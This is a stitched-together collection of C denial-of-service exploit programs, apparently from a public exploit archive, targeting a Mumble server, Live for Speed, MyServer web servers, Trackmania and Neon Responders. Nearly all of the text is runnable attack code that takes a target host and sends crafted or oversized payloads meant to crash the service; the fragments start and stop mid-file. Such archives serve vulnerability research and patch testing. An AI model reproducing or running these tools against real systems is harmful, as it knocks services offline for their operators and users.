    #define ONESEC  1
    #define stristr strcasestr
    #define stricmp strcasecmp
    #define strnicmp strncasecmp
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define PORT        64738
#define BUFFSZ      0xffff

#define SSL_CLOSE   SSL_shutdown(ssl_sd); \
                    SSL_free(ssl_sd); \
                    SSL_CTX_free(ctx_sd); \
                    close(sd);
#define SSL_COMP(X) SSL_CTX_set_cipher_list(X, "ALL"); \
                    SSL_CTX_set_options(X, SSL_OP_ALL);



int mysend(SSL *ssl_sd, int sd, u8 *data, int datasz);
int myrecv(SSL *ssl_sd, int sd, u8 *data, int datasz);
int mumble_send(SSL *ssl_sd, int sd, int type, u8 *data, int size);
int mumble_recv(SSL *ssl_sd, int sd, int *type, u8 *data, int max_size);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int putcc(u8 *data, int chr, int size);
int getmb(u8 *data, u32 *num);
int putmb(u8 *data, u32 num);
int putss(u8 *data, u8 *str, int type);
int putmm(u8 *data, u8 *mem, int size);
int recv_tcp(SSL *ssl_sd, int sd, u8 *data, int datalen);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    static struct   linger  ling = {1,1};
    const SSL_METHOD  *method;
    SSL_CTX *ctx_sd = NULL;
    SSL     *ssl_sd = NULL;
    struct  sockaddr_in peer;
    int     sd,
            len,
            try;
    u16     port    = PORT;
    u8      password[64] = "",
            *buff,
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    fputs("\n"
        "Mumble server <= 1.2.3 SQLite error "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stderr);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%u)]\n"
            "\n", argv[0], port);
        exit(1);
    }
    host = argv[1];
    if(argc > 2) port = atoi(argv[2]);

    SSL_library_init();
    //SSL_load_error_strings();

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    buff = malloc(0xffff);
    if(!buff) std_err();

    for(try = 0;; try++) {
        switch(try) {
            case 0: method = SSLv3_method();    break;
            case 1: method = TLSv1_method();    break;
            case 2: method = SSLv2_method();    break;
            case 3: method = SSLv23_method();   break;
            default: {
                printf("\nError: unsupported SSL method or not a SSL connection\n");
                exit(1);
                break;
            }
        }
        sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(sd < 0) std_err();
        setsockopt(sd, SOL_SOCKET, SO_LINGER, (char *)&ling, sizeof(ling));
        if(connect(sd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in))
          < 0) std_err();

        ctx_sd = SSL_CTX_new(method);
        SSL_COMP(ctx_sd)
        ssl_sd = SSL_new(ctx_sd);
        SSL_set_fd(ssl_sd, sd);

        // mysend is necessary to guess if the ssl version is wrong
        if((SSL_connect(ssl_sd) < 0) || (mysend(ssl_sd, sd, "", 0) != 0)) {
            SSL_CLOSE
            printf("- try another SSL version\n");
        } else {
            break;
        }
    }

    len = mumble_recv(ssl_sd, sd, NULL, buff, BUFFSZ);
    if(len < 0) std_err();
    mumble_send(ssl_sd, sd, 0, buff, len);  // send version back, easy way

    /* alternative correct way
    p = buff;
    p += putxx(p, -1, 32);
    p += putss(p, "1.2.2", 0x12);
    p += putss(p, "Win", 0x1a);
    p += putss(p, "5.1.2500.1", 0x22);
    mumble_send(ssl_sd, sd, 0, buff, p - buff); */

    p = buff;
    p += putss(p, "myusername", 0x0a);
    p += putss(p, password, 0x12);
    p += putmb(p, 0x20);    p += putmb(p, 0);   // codec
    mumble_send(ssl_sd, sd, 2, buff, p - buff);

    p = buff;
    *p++ = 0x12;
    p += putmb(p, 0x7fff);
    p += putcc(p, 0xff, 0x7fff);
    mumble_send(ssl_sd, sd, 0xe, buff, p - buff);

    len = mumble_recv(ssl_sd, sd, NULL, buff, BUFFSZ);

    SSL_CLOSE
    printf("\n- done, check the server manually\n");
    return(0);
}



int mysend(SSL *ssl_sd, int sd, u8 *data, int datasz) {
    if(ssl_sd) return(SSL_write(ssl_sd, data, datasz));
    return(send(sd, data, datasz, 0));
}



int myrecv(SSL *ssl_sd, int sd, u8 *data, int datasz) {
    if(ssl_sd) return(SSL_read(ssl_sd, data, datasz));
    return(recv(sd, data, datasz, 0));
}



int mumble_send(SSL *ssl_sd, int sd, int type, u8 *data, int size) {
    u8      tmp[2 + 4];

    putxx(tmp, type, 16);
    putxx(tmp + 2, size, 32);
    if(mysend(ssl_sd, sd, tmp, 2 + 4) < 0) return(-1);
    if(size <= 0) return(0);
    return(mysend(ssl_sd, sd, data, size));
}



int mumble_recv(SSL *ssl_sd, int sd, int *type, u8 *data, int max_size) {
    u32     size;
    u8      tmp[2 + 4];

    if(recv_tcp(ssl_sd, sd, tmp,  2 + 4) < 0) return(-1);
    if(type) getxx(tmp, type, 16);
    getxx(tmp + 2, &size, 32);
    if(!size) return(0);
    if(size > max_size) return(-1); // lazy
    if(recv_tcp(ssl_sd, sd, data, size) < 0) return(-1);
    return(size);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;
    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << ((bytes - 1 - i) << 3));
    }
    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> ((bytes - 1 - i) << 3)) & 0xff;
    }
    return(bytes);
}



int putcc(u8 *data, int chr, int size) {
    memset(data, chr, size);
    return(size);
}



int getmb(u8 *data, u32 *num) {
    u32     result;
    u8      b,
            *ptr;

    result = 0;
    ptr = data;

    if(*ptr < 0x80) {
        result = *ptr;
    } else {
        b = *(ptr++); result  = (b & 0x7F)      ; if (!(b & 0x80)) goto done;
        b = *(ptr++); result |= (b & 0x7F) <<  7; if (!(b & 0x80)) goto done;
        b = *(ptr++); result |= (b & 0x7F) << 14; if (!(b & 0x80)) goto done;
        b = *(ptr++); result |= (b & 0x7F) << 21; if (!(b & 0x80)) goto done;
        b = *(ptr++); result |=  b         << 28; if (!(b & 0x80)) goto done;
    }
done:
    *num = result;
    return(ptr - data);
}



int putmb(u8 *target, u32 value) {
  if (value < (1 << 7)) {
    target[0] = value;
    return /*target + */1;
  } else if (value < (1 << 14)) {
    target[0] = (u8)(value | 0x80);
    target[1] = (u8)(value >> 7);
    return /*target + */2;
  } else {
  target[0] = (u8)(value | 0x80);
  if (value >= (1 << 7)) {
    target[1] = (u8)((value >>  7) | 0x80);
    if (value >= (1 << 14)) {
      target[2] = (u8)((value >> 14) | 0x80);
      if (value >= (1 << 21)) {
        target[3] = (u8)((value >> 21) | 0x80);
        if (value >= (1 << 28)) {
          target[4] = (u8)(value >> 28);
          return /*target + */5;
        } else {
          target[3] &= 0x7F;
          return /*target + */4;
        }
      } else {
        target[2] &= 0x7F;
        return /*target + */3;
      }
    } else {
      target[1] &= 0x7F;
      return /*target + */2;
    }
  } else {
    target[0] &= 0x7F;
    return /*target + */1;
  }
  }
}



int putss(u8 *data, u8 *str, int type) {
    u32     len;
    u8      *p;

    len = strlen(str);
    p = data;

    if(type >= 0) p += putmb(p, type);
    p += putmb(p, len);
    p += putmm(p, str, len);
    return(p - data);
}



int putmm(u8 *data, u8 *mem, int size) {
    memcpy(data, mem, size);
    return(size);
}



int recv_tcp(SSL *ssl_sd, int sd, u8 *data, int datalen) {
    int     len,
            t;

    for(len = 0; len < datalen; len += t) {
        if(!ssl_sd) {   // timeout can't be used with ssl because ssl is a layer over TCP
            if(timeout(sd, 10) < 0) return(-1);
        }
        t = myrecv(ssl_sd, sd, data + len, datalen - len);
        if(t <= 0) return(-1);
    }
    return(len);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            fprintf(stderr, "\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


/*

Live for Speed <= S2 Z13 forced match restart 0.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <windows.h>



#define PCKS        100 // even 2 is enough



int __cdecl mysend(SOCKET s, u_char **retbuf, int len, int flags) {
    u_char  *buf = *retbuf; // do NOT touch this

    int     i;
    u_char  *p,
            *newbuf;

    if((len >= (1 + 5 + 24 + 8)) && (buf[1] == 1) && (buf[2] == 24)) {
        newbuf = malloc(len * PCKS);    // avoid to hook send()

        p = newbuf;
        for(i = 0; i < PCKS; i++) {
            memcpy(p, buf, len);
            p += len;
        }
        len = p - newbuf;
        buf = newbuf;
    }

    *retbuf = buf;  // do NOT touch this
    return(len);
}



BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch(fdwReason) {
        case DLL_PROCESS_ATTACH: {
            DisableThreadLibraryCalls(hinstDLL);
            break;
        }
        default: break;
    }
    return(TRUE);
}


/* MyServer 0.4.3 DoS 
 * vendor:
 * http://myserverweb.sourceforge.net
 *
 * Written and found by badpack3t at security-protocols.com
 * For SP Research Labs
 * 09/08/2003
 *
 * usage: 
 * sp-myserv <targetip> [targetport] (default is 80)
 */

#include "stdafx.h"
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char exploit[] = 

/* entire request */
"\x47\x45\x54\x20\x2f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f\x3f"
"\x3f\x3f\x3f\x3f\x3f\x2e\x48\x54\x4d\x4c\x3f\x74\x65\x73\x74\x76"
"\x61\x72\x69\x61\x62\x6c\x65\x3d\x26\x6e\x65\x78\x74\x74\x65\x73"
"\x74\x76\x61\x72\x69\x61\x62\x6c\x65\x3d\x67\x69\x66\x20\x48\x54"
"\x54\x50\x2f\x31\x2e\x31\x0a\x52\x65\x66\x65\x72\x65\x72\x3a\x20"
"\x68\x74\x74\x70\x3a\x2f\x2f\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74"
"\x2f\x62\x6f\x62\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70"
"\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78"
"\x2d\x77\x77\x77\x2d\x66\x6f\x72\x6d\x2d\x75\x72\x6c\x65\x6e\x63"
"\x6f\x64\x65\x64\x0a\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x3a"
"\x20\x4b\x65\x65\x70\x2d\x41\x6c\x69\x76\x65\x0a\x43\x6f\x6f\x6b"
"\x69\x65\x3a\x20\x56\x41\x52\x49\x41\x42\x4c\x45\x3d\x53\x45\x43"
"\x55\x52\x49\x54\x59\x2d\x50\x52\x4f\x54\x4f\x43\x4f\x4c\x53\x3b"
"\x20\x70\x61\x74\x68\x3d\x2f\x0a\x55\x73\x65\x72\x2d\x41\x67\x65"
"\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x37\x36"
"\x20\x5b\x65\x6e\x5d\x20\x28\x58\x31\x31\x3b\x20\x55\x3b\x20\x4c"
"\x69\x6e\x75\x78\x20\x32\x2e\x34\x2e\x32\x2d\x32\x20\x69\x36\x38"
"\x36\x29\x0a\x56\x61\x72\x69\x61\x62\x6c\x65\x3a\x20\x72\x65\x73"
"\x75\x6c\x74\x0a\x48\x6f\x73\x74\x3a\x20\x6c\x6f\x63\x61\x6c\x68"
"\x6f\x73\x74\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x6c\x65\x6e\x67"
"\x74\x68\x3a\x20\x20\x20\x20\x20\x35\x31\x33\x0a\x41\x63\x63\x65"
"\x70\x74\x3a\x20\x69\x6d\x61\x67\x65\x2f\x67\x69\x66\x2c\x20\x69"
"\x6d\x61\x67\x65\x2f\x78\x2d\x78\x62\x69\x74\x6d\x61\x70\x2c\x20"
"\x69\x6d\x61\x67\x65\x2f\x6a\x70\x65\x67\x2c\x20\x69\x6d\x61\x67"
"\x65\x2f\x70\x6a\x70\x65\x67\x2c\x20\x69\x6d\x61\x67\x65\x2f\x70"
"\x6e\x67\x0a\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69"
"\x6e\x67\x3a\x20\x67\x7a\x69\x70\x0a\x41\x63\x63\x65\x70\x74\x2d"
"\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x0a\x41\x63\x63"
"\x65\x70\x74\x2d\x43\x68\x61\x72\x73\x65\x74\x3a\x20\x69\x73\x6f"
"\x2d\x38\x38\x35\x39\x2d\x31\x2c\x2a\x2c\x75\x74\x66\x2d\x38\x0a"
"\x0a\x0a\x77\x68\x61\x74\x79\x6f\x75\x74\x79\x70\x65\x64\x3d\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x0a\x0a\r\n";

int main(int argc, char *argv[])
{
	WSADATA wsaData;
	WORD wVersionRequested;
	struct hostent  *pTarget;
	struct sockaddr_in 	sock;
	char *target, buffer[30000];
	int port,bufsize;
	SOCKET mysocket;
	
	if (argc < 2)
	{
		printf("MyServer 0.4.3 DoS by badpack3t\r\n <badpack3t@security-protocols.com>\r\n\r\n", argv[0]);
		printf("Usage:\r\n %s <targetip> [targetport] (default is 80)\r\n\r\n", argv[0]);
		printf("www.security-protocols.com\r\n\r\n", argv[0]);
		exit(1);
	}

	wVersionRequested = MAKEWORD(1, 1);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

	target = argv[1];
	port = 80;

	if (argc >= 3) port = atoi(argv[2]);
	bufsize = 1024;
	if (argc >= 4) bufsize = atoi(argv[3]);

	mysocket = socket(AF_INET, SOCK_STREAM, 0);
	if(mysocket==INVALID_SOCKET)
	{	
		printf("Socket error!\r\n");
		exit(1);
	}

	printf("Resolving Hostnames...\n");
	if ((pTarget = gethostbyname(target)) == NULL)
	{
		printf("Resolve of %s failed\n", argv[1]);
		exit(1);
	}

	memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons((USHORT)port);

	printf("Connecting...\n");
	if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) )))
	{
		printf("Couldn't connect to host.\n");
		exit(1);
	}

	printf("Connected!...\n");
	printf("Sending Payload...\n");
	if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1)
	{
		printf("Error Sending the Exploit Payload\r\n");
		closesocket(mysocket);
		exit(1);
	}

	printf("Remote Webserver has been DoS'ed \r\n");
	closesocket(mysocket);
	WSACleanup();
	return 0;
}/****************************/ 
PoC to crash the server 
/****************************/ 

/* MyServer 0.7.1 POST Denial Of Service 
vendor URL: 
http://www.myserverproject.net 

coded and discovered by: 
badpack3t 
for .:sp research labs:. 
www.security-protocols.com 
9.20.2004 
Tested on Mandrake 10.0 

usage: 
sp-myserv-0.7.1 [targetport] (default is 80) 
*/ 

#include <'winsock2.h> 
#include <'stdio.h> 

#pragma comment(lib, "ws2_32.lib") 

char exploit[] = 

"POST index.html?View=Logon HTTP/1.1 " 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
": ihack.ms "; 

int main(int argc, char *argv[]) 
{ 
WSADATA wsaData; 
WORD wVersionRequested; 
struct hostent *pTarget; 
struct sockaddr_in sock; 
char *target; 
int port,bufsize; 
SOCKET mysocket; 

if (argc < 2) 
{ 
printf("MyServer 0.7.1 POST DoS by badpack3t ", argv[0]); 
printf("Usage: %s [targetport] (default is 80) ", argv[0]); 
printf("www.security-protocols.com ", argv[0]); 
exit(1); 
} 

wVersionRequested = MAKEWORD(1, 1); 
if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1; 

target = argv[1]; 
port = 80; 

if (argc >= 3) port = atoi(argv[2]); 
bufsize = 1024; 
if (argc >= 4) bufsize = atoi(argv[3]); 

mysocket = socket(AF_INET, SOCK_STREAM, 0); 
if(mysocket==INVALID_SOCKET) 
{ 
printf("Socket error! "); 
exit(1); 
} 

printf("Resolving Hostnames... "); 
if ((pTarget = gethostbyname(target)) == NULL) 
{ 
printf("Resolve of %s failed ", argv[1]); 
exit(1); 
} 

memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length); 
sock.sin_family = AF_INET; 
sock.sin_port = htons((USHORT)port); 

printf("Connecting... "); 
if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) ))) 
{ 
printf("Couldn't connect to host. "); 
exit(1); 
} 

printf("Connected!... "); 
printf("Sending Payload... "); 
if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1) 
{ 
printf("Error Sending the Exploit Payload "); 
closesocket(mysocket); 
exit(1); 
} 

printf("Payload has been sent! Check if the webserver is dead! "); 
closesocket(mysocket); 
WSACleanup(); 
return 0; 
}

// milw0rm.com [2004-09-27]
source: http://www.securityfocus.com/bid/9604/info

It has been reported that Nadeo Game Engine may be prone to a remote denial of service vulnerability that could allow an attacker to cause the software to crash or hang by sending arbitrary data to the software on TCP port 2350.

Nadeo Trackmania demo version has been reported to be affected by this issue.

/*
* [kill-trackmania.c]
* A remote DoS that affects the Trackmania game server
*
* by Scrap
* webmaster@securiteinfo.com
* http://www.securiteinfo.com
*
* gcc kill-trackmania.c -o kill-trackmania -O2
*
*/

#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>

int main(int argc, char *argv[])
{
int sock;
struct sockaddr_in sin;
struct hostent *he;
unsigned long start;
char buffer[1024];
unsigned long counter;

printf("\n [kill-trackmania.c] by Scrap / Securiteinfo.com\n");

if (argc<2)

{
printf("Usage: %s target\n\n",argv[0]);
exit(0);
}

if ((he=gethostbyname(argv[1])) == NULL)
{
herror("gethostbyname");
exit(0);
}

start=inet_addr(argv[1]);
counter=ntohl(start);

sock=socket(AF_INET, SOCK_STREAM, 0);
bcopy(he->h_addr, (char *)&sin.sin_addr, he->h_length);
sin.sin_family=AF_INET;
sin.sin_port=htons(2350);

if (connect(sock, (struct sockaddr*)&sin, sizeof(sin))!=0)
{
perror("connect");
exit(0);
}
printf("\n\t Sending Bomb... \n");
send(sock, "Bomb from Securiteinfo.com\n\n",17,0);
close(sock);

printf("\t Bomb sent...\n");

}source: http://www.securityfocus.com/bid/17569/info

Neon Responders is susceptible to a remote denial-of-service vulnerability. This issue is due to the application's failure to properly handle malformed network packets.

This issue allows remote attackers to crash the affected application, denying further service to legitimate users.

Version 5.4 of Neon Responders for Windows is vulnerable to this issue; other versions may also be affected.

/* Stefan Lochbihler*/

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

#pragma comment(lib,"ws2_32")

#define PORT 4347
char CLOCK_MSG [] =
"\x00\x0e\x5a\x00\x4c\xe9\x24\xb1\x17\x88\x40\x84";   //Password = ""

void usage (char*);
void endpgr (char *,SOCKET, char*);
unsigned long gethost (char *);


int main(int argc, char *argv[])
{

    WSADATA wsa;
    SOCKET client;
    sockaddr_in peer;
    WORD wsVersion;

    char sendbuffer[16]="";
    char recvbuffer[16]="";
    unsigned long host=0;
    int err=0;

    if(argc<2)
      usage(argv[0]);

    printf("\n~~~~~~ Neon Responder DoS - (c) by Stefan Lochbihler ~~~~~\n\n");


    if(WSAStartup(wsVersion=MAKEWORD(2,2),&wsa)!=0)
    {
        printf("WSAStartup() fail\n");
        exit(0);
    }

    printf("%s:[+] Try to create socket\n",argv[0]);
    client=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    if(client==INVALID_SOCKET)
       endpgr(argv[0],client,"[-] socket() fail");

    printf("%s:[+] Lookup host\n",argv[0]);
    if(!(host=gethost(argv[1])))
       endpgr(argv[0],client,"[-] host not found !");

    peer.sin_family = AF_INET;
    peer.sin_port = htons(PORT);
    peer.sin_addr.s_addr = host;

    printf("%s:[+] Connect to %s\n",argv[0],argv[1]);
    err=connect(client,(SOCKADDR*)&peer,sizeof(struct sockaddr_in));
    if(err)
      endpgr(argv[0],client,"[-] connect() fail");

    memcpy(sendbuffer,CLOCK_MSG,sizeof(CLOCK_MSG));

    printf("%s:[+] Try to send packet\n",argv[0]);
    err=send(client,sendbuffer,sizeof(sendbuffer),0);
    err=recv(client,recvbuffer,sizeof(recvbuffer)-1,0);

    endpgr(argv[0],client,"[+] End successfully");

    return 0;

}

void usage(char *pgrname)
{
printf("\n~~~~~~ Neon Responder DoS - (c) by Stefan Lochbihler ~~~~~~\n\n");
printf("%s: <Targethost>\n",pgrname);
exit(0);
}

void endpgr (char *pgrname, SOCKET client,char *msg)
{
    printf("%s:%s\n",pgrname,msg);
    WSACleanup();
    closesocket(client);
    exit(0);
}

unsigned long gethost(char *targethost)
{
unsigned long host=0;
hostent *phost=NULL;


host=inet_addr(targethost);
if(host==INADDR_NONE)
{
    if((phost=gethostbyname(targethost))==NULL)
       return 0;
    host=*(unsigned long*)phost->h_addr;
}

return host;
}
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
